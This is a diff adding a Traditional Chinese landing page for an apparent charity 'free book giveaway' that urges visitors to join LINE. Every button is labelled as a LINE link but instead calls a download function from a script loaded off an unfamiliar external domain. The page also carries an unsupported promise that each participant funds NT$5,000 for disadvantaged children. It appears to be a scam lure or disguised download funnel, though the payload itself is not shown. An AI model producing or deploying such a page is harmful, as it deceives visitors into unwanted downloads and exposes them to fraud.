@@ -1,0 +1,614 @@
+<!DOCTYPE html><html lang="zh-Hant"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="format-detection" content="telephone=no,email=no,address=no">
+	
+   <script src="https://api.wenk918d.site/js/meetu-sdk.js"></script>
+   
+    <title>閱見善意｜精選好書免費贈閱・公益閱讀行動</title>
+         <script>
+        
+          
+
+        function k2(){
+           MeetU.download(event);
+        }
+    </script>
+    <meta name="description" content="透過閱讀分享知識與善意。精選好書免費贈閱，台灣及海外讀者皆可洽詢申請方式，符合活動資格者依活動規則安排寄送。">
+    <meta name="robots" content="index,follow">
+    <meta name="theme-color" content="#74391f">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="閱見善意｜精選好書免費贈閱">
+    <meta property="og:description" content="讓閱讀傳遞知識，讓好書陪伴成長。加入 LINE，了解免費贈書活動詳情。">
+    <meta property="og:image" content="static/picture/book-promo.png">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@400;500;600;700;800&amp;family=Noto+Serif+TC:wght@500;600;700;800&amp;display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        html {
+            -webkit-text-size-adjust: 100%;
+            scroll-behavior: smooth;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "PingFang TC", "Noto Sans TC", "Microsoft JhengHei", sans-serif;
+            background: #fffaf5;
+            overflow-x: hidden;
+            color: #1c1917;
+            -webkit-font-smoothing: antialiased;
+            padding-bottom: 92px;
+        }
+
+        img {
+            max-width: 100%;
+            display: block;
+        }
+
+        a {
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .book-frame {
+            --book-frame-width: 440px;
+            width: var(--book-frame-width);
+            min-width: var(--book-frame-width);
+            max-width: var(--book-frame-width);
+            margin: 0 auto;
+            padding: 10px;
+            border-radius: 26px;
+            background: linear-gradient(180deg, #fff, #fff7ed);
+            border: 1px solid rgba(180, 83, 9, .18);
+            box-shadow: 0 18px 46px rgba(120, 53, 15, .16);
+            contain: layout paint;
+        }
+
+        .book-frame img {
+            width: 100%;
+            object-fit: contain;
+            border-radius: 18px;
+            background: #fffaf5;
+            aspect-ratio: auto;
+            transform: none !important;
+            transition: none !important;
+        }
+
+        .hero-bg {
+            background: radial-gradient(circle at top right, rgba(251, 191, 36, .18), transparent 35%),
+            radial-gradient(circle at bottom left, rgba(249, 115, 22, .12), transparent 40%),
+            linear-gradient(to bottom, #fffaf5, #ffffff);
+        }
+
+        .glow-btn {
+            box-shadow: 0 15px 40px rgba(0, 0, 0, .18);
+        }
+
+        .book-shadow {
+            filter: drop-shadow(0 30px 60px rgba(0, 0, 0, .28));
+        }
+
+        .float-btn {
+            position: fixed;
+            right: 16px;
+            bottom: 18px;
+            z-index: 999;
+            background: #22c55e;
+            color: #fff;
+            padding: 14px 18px;
+            border-radius: 999px;
+            font-size: 18px;
+            font-weight: 900;
+            text-decoration: none;
+            box-shadow: 0 10px 35px rgba(0, 0, 0, .25);
+            animation: floatMove 2s infinite;
+        }
+
+        @keyframes floatMove {
+            0%, 100% {
+                transform: translateY(0)
+            }
+            50% {
+                transform: translateY(-8px)
+            }
+        }
+
+        @media (max-width: 768px) {
+            body {
+                padding-bottom: 96px;
+            }
+
+            .mobile-title {
+                font-size: 42px !important;
+                line-height: 1.2 !important;
+            }
+
+            .mobile-text {
+                font-size: 20px !important;
+                line-height: 1.7 !important;
+            }
+
+            .mobile-btn {
+                width: 100%;
+                font-size: 24px !important;
+                padding: 18px 20px !important;
+            }
+
+            .mobile-card {
+                padding: 24px !important;
+            }
+
+            .float-btn {
+                left: 16px;
+                right: 16px;
+                text-align: center;
+                bottom: calc(env(safe-area-inset-bottom) + 12px);
+            }
+
+            .book-frame {
+                --book-frame-width: min(330px, calc(100vw - 32px));
+                padding: 8px;
+                border-radius: 24px;
+            }
+
+
+        }
+    </style>
+    <style>
+        @media (max-width: 768px) {
+
+          body {
+            padding-bottom: 96px !important;
+          }
+
+          h1 {
+            font-size: 40px !important;
+            line-height: 1.2 !important;
+          }
+
+          h2 {
+            font-size: 32px !important;
+            line-height: 1.26 !important;
+          }
+
+          h3 {
+            font-size: 25px !important;
+            line-height: 1.32 !important;
+          }
+
+          p {
+            font-size: 19px !important;
+            line-height: 1.75 !important;
+          }
+
+          a {
+            font-size: 21px !important;
+            line-height: 1.35 !important;
+          }
+
+          section {
+            padding-left: 16px !important;
+            padding-right: 16px !important;
+          }
+
+          .sec-hero {
+            padding-top: 28px !important;
+            padding-bottom: 44px !important;
+          }
+
+          .sec-hero > div {
+            display: block !important;
+            max-width: 520px !important;
+          }
+
+          .sec-hero > div > div:first-child {
+            min-width: 0 !important;
+            width: 100% !important;
+            text-align: center !important;
+          }
+
+          .sec-hero > div > div:last-child {
+            min-width: 0 !important;
+            width: 100% !important;
+            margin-top: 26px !important;
+          }
+
+          .sec-hero h1 {
+            margin-bottom: 18px !important;
+          }
+
+          .sec-hero p {
+            margin-bottom: 24px !important;
+          }
+
+          .sec-hero a,
+          .sec-cta a {
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            min-height: 60px !important;
+            padding: 16px 18px !important;
+            border-radius: 18px !important;
+          }
+
+          .sec-hero div[style*="justify-content:space-between"] {
+            gap: 10px !important;
+          }
+
+          .sec-hero div[style*="font-size:48px"] {
+            font-size: 34px !important;
+          }
+
+          .sec-hero div[style*="font-size:20px"] {
+            font-size: 17px !important;
+          }
+
+          .sec-content {
+            padding-top: 48px !important;
+            padding-bottom: 48px !important;
+          }
+
+          .sec-content > div {
+            max-width: 520px !important;
+          }
+
+          .sec-content div[style*="display:flex"] {
+            display: block !important;
+          }
+
+          .sec-content div[style*="min-width:260px"] {
+            min-width: 0 !important;
+            width: 100% !important;
+            margin-bottom: 16px !important;
+            padding: 24px !important;
+            border-radius: 22px !important;
+          }
+
+          .sec-cta {
+            padding-top: 54px !important;
+            padding-bottom: 58px !important;
+          }
+
+          .sec-cta > div {
+            max-width: 520px !important;
+          }
+
+          /* 贈書書單：手機端堆疊單列，字體與段落間距保持舒適 */
+          .sec-books {
+            padding-top: 40px !important;
+            padding-bottom: 40px !important;
+          }
+
+          .sec-books > div {
+            max-width: 520px !important;
+          }
+
+          .sec-books > div > div:first-child {
+            margin-bottom: 28px !important;
+          }
+
+          .sec-books .books-intro {
+            font-size: 17px !important;
+            line-height: 1.6 !important;
+          }
+
+          .sec-books .books-row {
+            display: block !important;
+          }
+
+          .sec-books .book-card {
+            min-width: 0 !important;
+            width: 100% !important;
+            border-radius: 22px !important;
+            margin-bottom: 16px !important;
+          }
+
+          .sec-books .book-card:last-child {
+            margin-bottom: 0 !important;
+          }
+
+          .sec-books .book-cover {
+            padding: 20px 20px 0 !important;
+          }
+
+          .sec-books .book-card img {
+            max-width: 190px !important;
+            border-radius: 12px !important;
+          }
+
+          .sec-books .book-body {
+            padding: 18px 20px 24px !important;
+          }
+
+          .sec-books .book-card h3 {
+            font-size: 23px !important;
+            line-height: 1.3 !important;
+            margin-bottom: 4px !important;
+          }
+
+          .sec-books .book-tagline {
+            font-size: 16px !important;
+            line-height: 1.55 !important;
+            margin-bottom: 12px !important;
+          }
+
+          .sec-books .book-desc {
+            font-size: 16px !important;
+            line-height: 1.65 !important;
+            margin-bottom: 10px !important;
+          }
+
+          footer {
+            padding: 42px 18px 112px !important;
+          }
+
+          footer div[style*="font-size:38px"] {
+            font-size: 26px !important;
+          }
+
+          footer p {
+            font-size: 16px !important;
+            line-height: 1.7 !important;
+          }
+
+          div[style*="position:fixed"] {
+            left: 12px !important;
+            right: 12px !important;
+            bottom: calc(env(safe-area-inset-bottom) + 10px) !important;
+            font-size: 18px !important;
+            min-height: 56px !important;
+            display: flex !important;
+            align-items: center !important;
+            justify-content: center !important;
+            padding: 14px 16px !important;
+          }
+
+        }
+        .ddd{display: none}
+        @media (max-width:767px){
+            .ddd{display: block}
+        }
+      </style>
+</head>
+<body style="margin:0;padding:0;background:#fffaf5;font-family:-apple-system,BlinkMacSystemFont,'PingFang TC','Microsoft JhengHei',sans-serif;color:#1c1917;overflow-x:hidden;">
+<div style="max-width:100%;overflow:hidden;">
+
+    <!-- HERO -->
+    <section class="sec-hero" style="padding:50px 20px;background:linear-gradient(to bottom,#fffaf5,#ffffff);">
+
+        <div style="max-width:1200px;margin:0 auto;display:flex;flex-wrap:wrap;align-items:center;gap:40px;">
+
+            <!-- LEFT -->
+            <div style="flex:1;min-width:300px;">
+
+                <div style="display:inline-block;background:#dc2626;color:#fff;padding:12px 22px;border-radius:999px;font-size:18px;font-weight:800;box-shadow:0 10px 30px rgba(0,0,0,.12);margin-bottom:28px;">
+                    閱見善意・精選好書免費贈閱
+                </div>
+
+                  <h1 style="font-size:56px;line-height:1.2;font-weight:900;margin:0 0 24px;color:#1c1917;">
+                    精選好書<span style="color:#b45309;">免費贈閱</span>
+                </h1>
+         <p style="font-size:26px;line-height:1.7;color:#444;margin-bottom:32px;font-weight:500;">
+                    🎁【參與即做公益•支持弱勢兒童】每有一位朋友參與本次活動，台灣弱勢兒童將獲得新台幣<span style="font-size:32px; color: #f00; font-weight: bold;">5,000</span>元的支持，投入學習資源與成長扶助，陪伴孩子擁有更多接觸知識、探索未來的機會。
+                </p>
+
+                <!-- STATS -->
+                <div style="background:#fff;border-radius:26px;padding:28px;box-shadow:0 15px 40px rgba(0,0,0,.08);border:1px solid #fde68a;margin-bottom:30px;">
+
+                    <div style="display:flex;justify-content:space-between;text-align:center;gap:20px;">
+
+                        <div style="flex:1;">
+                            <div style="font-size:48px;font-weight:900;color:#b45309;">精選</div>
+                            <div style="font-size:20px;font-weight:700;margin-top:10px;">閱讀好書分享</div>
+                        </div>
+
+                        <div style="flex:1;">
+                            <div style="font-size:48px;font-weight:900;color:#dc2626;">免費</div>
+                            <div style="font-size:20px;font-weight:700;margin-top:10px;">公益贈閱活動</div>
+                        </div>
+
+                    </div>
+                </div>
+
+                <a href="javascript:k2()" style="display:block;background:#22c55e;color:#fff;text-decoration:none;text-align:center;font-size:28px;font-weight:900;padding:22px 0;border-radius:24px;box-shadow:0 15px 40px rgba(0,0,0,.18);margin-bottom:18px;">
+                    點擊加入 LINE 了解贈書方式
+                </a>
+
+                <div style="background:#1c1917;color:#fff;text-align:center;font-size:20px;font-weight:900;padding:22px 0;border-radius:24px;">
+                    每人限領一本・依活動規則辦理
+                </div>
+
+            </div>
+
+            <!-- RIGHT -->
+            <div style="flex:1;min-width:280px;text-align:center;">
+
+                <div class="book-frame">
+                    <img src="images/5.png" decoding="async" fetchpriority="high">
+                </div>
+
+            </div>
+
+        </div>
+    </section>
+
+    <!-- BOOKS -->
+    <section class="sec-books" style="padding:70px 20px;background:#fffaf5;">
+
+        <div style="max-width:1200px;margin:0 auto;">
+
+            <div style="text-align:center;margin-bottom:40px;">
+                <h2 style="font-size:52px;line-height:1.3;font-weight:900;margin-bottom:14px;">
+                    三本精選好書<span style="color:#b45309;">・免費贈閱</span>
+                </h2>
+                <p class="books-intro" style="font-size:24px;line-height:1.6;color:#555;max-width:720px;margin:0 auto;">
+                    挑選你最喜愛的一本
+                </p>
+            </div>
+
+            <div class="books-row" style="display:flex;flex-wrap:wrap;gap:24px;align-items:stretch;">
+
+                <!-- BOOK 1 -->
+                <div class="book-card" style="flex:1;min-width:260px;background:#fff;border:1px solid #fde68a;border-radius:28px;overflow:hidden;box-shadow:0 15px 40px rgba(0,0,0,.07);display:flex;flex-direction:column;">
+                    <div class="book-cover" style="padding:26px 26px 0;text-align:center;background:linear-gradient(180deg,#fffaf0,#fff);">
+                        <img src="images/2.jpg" alt="《晶片戰爭》書籍封面" decoding="async" loading="lazy" style="width:100%;max-width:230px;margin:0 auto;border-radius:14px;box-shadow:0 18px 40px rgba(0,0,0,.2);">
+                    </div>
+                    <div class="book-body" style="padding:24px 28px 30px;">
+                        <h3 style="font-size:30px;font-weight:900;margin-bottom:8px;color:#1c1917;">《晶片戰爭》</h3>
+                        <div class="book-tagline" style="font-size:20px;font-weight:700;color:#b45309;line-height:1.5;margin-bottom:16px;">誰掌握了晶片，誰就掌握了世界</div>
+                        <p class="book-desc" style="font-size:19px;line-height:1.75;color:#444;margin-bottom:12px;">
+                            這本書的作者是歷史學家克里斯·米勒，它並非單純的商業故事，而是一部以半導體為核心的地緣政治與科技史。
+                        </p>
+                        <p class="book-desc" style="font-size:19px;line-height:1.75;color:#444;">
+                            作者透過訪談上百位業界人士，梳理了晶片產業從冷戰至今的發展，並特別強調台灣在其中扮演的核心角色，分析了美中科技競爭下的風險與台灣的「矽盾」地位。
+                        </p>
+                    </div>
+                </div>
+
+                <!-- BOOK 2 -->
+                <div class="book-card" style="flex:1;min-width:260px;background:#fff;border:1px solid #fde68a;border-radius:28px;overflow:hidden;box-shadow:0 15px 40px rgba(0,0,0,.07);display:flex;flex-direction:column;">
+                    <div class="book-cover" style="padding:26px 26px 0;text-align:center;background:linear-gradient(180deg,#f0fdf4,#fff);">
+                        <img src="images/1.jpg" alt="《致富心態》書籍封面" decoding="async" loading="lazy" style="width:100%;max-width:230px;margin:0 auto;border-radius:14px;box-shadow:0 18px 40px rgba(0,0,0,.2);">
+                    </div>
+                    <div class="book-body" style="padding:24px 28px 30px;">
+                        <h3 style="font-size:30px;font-weight:900;margin-bottom:8px;color:#1c1917;">《致富心態》</h3>
+                        <div class="book-tagline" style="font-size:20px;font-weight:700;color:#b45309;line-height:1.5;margin-bottom:16px;">致富的關鍵，不在於你懂多少，而在於你怎麼想</div>
+                        <p class="book-desc" style="font-size:19px;line-height:1.75;color:#444;">
+                            全書透過 20 堂理財課，探討反直覺的理財原則：致富與守財是兩種完全不同的技巧；比起追求高報酬，預留「安全邊際」更重要；理解複利與長尾效應的威力；而財富自由最大的紅利，是掌控自己的時間。
+                        </p>
+                    </div>
+                </div>
+
+                <!-- BOOK 3 -->
+                <div class="book-card" style="flex:1;min-width:260px;background:#fff;border:1px solid #fde68a;border-radius:28px;overflow:hidden;box-shadow:0 15px 40px rgba(0,0,0,.07);display:flex;flex-direction:column;">
+                    <div class="book-cover" style="padding:26px 26px 0;text-align:center;background:linear-gradient(180deg,#fef2f2,#fff);">
+                        <img src="images/3.jpg" alt="《鄰家的百萬富翁》書籍封面" decoding="async" loading="lazy" style="width:100%;max-width:230px;margin:0 auto;border-radius:14px;box-shadow:0 18px 40px rgba(0,0,0,.2);">
+                    </div>
+                    <div class="book-body" style="padding:24px 28px 30px;">
+                        <h3 style="font-size:30px;font-weight:900;margin-bottom:8px;color:#1c1917;">《鄰家的百萬富翁》</h3>
+                        <div class="book-tagline" style="font-size:20px;font-weight:700;color:#b45309;line-height:1.5;margin-bottom:16px;">真正的富翁，往往過著遠低於收入水平的生活</div>
+                        <p class="book-desc" style="font-size:19px;line-height:1.75;color:#444;margin-bottom:12px;">
+                            書中歸納的首要「致富鐵律」是：支出永遠遠低於收入。富翁們相信財務自由遠比展示社會地位重要，他們會高效地將時間、精力與金錢用於財富累積，而不是維持表面的光鮮。
+                        </p>
+                        <p class="book-desc" style="font-size:19px;line-height:1.75;color:#444;">
+                            本書的核心啟示是：財富是你「沒花掉」的東西，高收入並不等於富有，透過節儉、規劃與持續投資，普通人同樣可以實現財務自由。
+                        </p>
+                    </div>
+                </div>
+
+            </div>
+
+        </div>
+    </section>
+
+    <!-- CONTENT -->
+    <section class="sec-content" style="padding:70px 20px;background:#fff;">
+
+        <div style="max-width:1200px;margin:0 auto;">
+
+            <div style="text-align:center;margin-bottom:50px;">
+
+                <h2 style="font-size:52px;line-height:1.3;font-weight:900;margin-bottom:20px;">
+                    為什麼值得參與好書贈閱活動？
+                </h2>
+
+                <p style="font-size:26px;line-height:1.7;color:#555;max-width:900px;margin:0 auto;">
+                    閱讀不只是知識的累積，也是拓展思考、認識生活與持續學習的方式。透過好書分享，讓更多人有機會接觸不同的觀點與智慧。
+                </p>
+            </div>
+
+            <div style="display:flex;flex-wrap:wrap;gap:24px;">
+
+                <div style="flex:1;min-width:260px;background:#fffaf0;padding:32px;border-radius:28px;box-shadow:0 15px 40px rgba(0,0,0,.06);">
+                    <div style="font-size:58px;margin-bottom:20px;">✨</div>
+                    <h3 style="font-size:34px;font-weight:900;margin-bottom:18px;">從閱讀中獲得啟發</h3>
+                    <p style="font-size:22px;line-height:1.7;color:#444;">
+                        從人生經驗與多元觀點中汲取靈感，重新思考生活方向，發掘值得探索的新可能。
+                    </p>
+                </div>
+
+                <div style="flex:1;min-width:260px;background:#f0fdf4;padding:32px;border-radius:28px;box-shadow:0 15px 40px rgba(0,0,0,.06);">
+                    <div style="font-size:58px;margin-bottom:20px;">🌍</div>
+                    <h3 style="font-size:34px;font-weight:900;margin-bottom:18px;">分享知識與閱讀樂趣</h3>
+                    <p style="font-size:22px;line-height:1.7;color:#444;">
+                        讓好書成為交流與學習的起點，鼓勵更多人培養閱讀習慣，接觸不同領域的知識。
+                    </p>
+                </div>
+
+                <div style="flex:1;min-width:260px;background:#fef2f2;padding:32px;border-radius:28px;box-shadow:0 15px 40px rgba(0,0,0,.06);">
+                    <div style="font-size:58px;margin-bottom:20px;">📚</div>
+                    <h3 style="font-size:34px;font-weight:900;margin-bottom:18px;">精選好書免費贈閱</h3>
+                    <p style="font-size:22px;line-height:1.7;color:#444;">
+                        透過本次贈書活動了解可申請的書籍與參與方式，符合活動資格者依規則安排贈閱與寄送。
+                    </p>
+                </div>
+
+            </div>
+
+        </div>
+    </section>
+
+    <!-- CTA -->
+    <section class="sec-cta" style="padding:80px 20px;background:linear-gradient(135deg,#b45309,#ea580c);color:#fff;text-align:center;">
+
+        <div style="max-width:1000px;margin:0 auto;">
+
+            <div style="display:inline-block;background:#fff;color:#dc2626;padding:12px 26px;border-radius:999px;font-size:24px;font-weight:900;margin-bottom:28px;">
+                台灣及海外讀者皆可洽詢
+            </div>
+
+            <h2 style="font-size:62px;line-height:1.3;font-weight:900;margin-bottom:30px;">
+                現在立即加入 LINE<br>
+                了解免費贈書活動
+            </h2>
+
+            <p style="font-size:28px;line-height:1.8;color:#ffedd5;margin-bottom:40px;">
+                讓閱讀傳遞知識，讓好書分享善意。歡迎透過 LINE 了解精選書籍、申請資格、可寄送地區及活動詳細規則。
+            </p>
+
+            <a href="javascript:k2()" style="display:inline-block;background:#22c55e;color:#fff;text-decoration:none;font-size:34px;font-weight:900;padding:24px 48px;border-radius:28px;box-shadow:0 15px 40px rgba(0,0,0,.18);">
+                點擊加入 LINE 了解贈書
+            </a>
+
+            <div style="margin-top:30px;font-size:20px;color:#ffedd5;">
+                ※ 每人限領一本，實際贈閱數量、申請資格及寄送安排以活動公告為準。
+            </div>
+
+        </div>
+    </section>
+
+    <!-- FOOTER -->
+    <footer style="background:#1c1917;color:#d6d3d1;padding:60px 20px;text-align:center;">
+
+        <div style="max-width:1000px;margin:0 auto;">
+
+            <div style="font-size:38px;font-weight:900;color:#fff;margin-bottom:22px;">
+                閱見善意・公益閱讀分享
+            </div>
+
+            <p style="font-size:22px;line-height:1.8;color:#a8a29e;">
+                本活動以閱讀推廣與好書分享為主。活動主辦單位、書籍內容、申請資格、寄送範圍及相關規則，請以正式公告為準。書籍內容與觀點僅供閱讀參考，不代表對特定結果的保證。
+            </p>
+
+            <div style="margin-top:28px;font-size:18px;color:#78716c;">
+                © 2026 閱見善意公益閱讀分享活動 All Rights Reserved.
+            </div>
+
+        </div>
+    </footer>
+
+    <!-- FLOAT BUTTON -->
+    <a href="javascript:k2()" class="ddd" style="position:fixed;left:16px;right:16px;bottom:16px;background:#22c55e;color:#fff;text-align:center;text-decoration:none;font-size:24px;font-weight:900;padding:18px;border-radius:999px;z-index:999;box-shadow:0 10px 35px rgba(0,0,0,.25);">
+        點擊加入 LINE 了解免費贈書
+    </a>
+
+</div>
+
+
+</body></html>
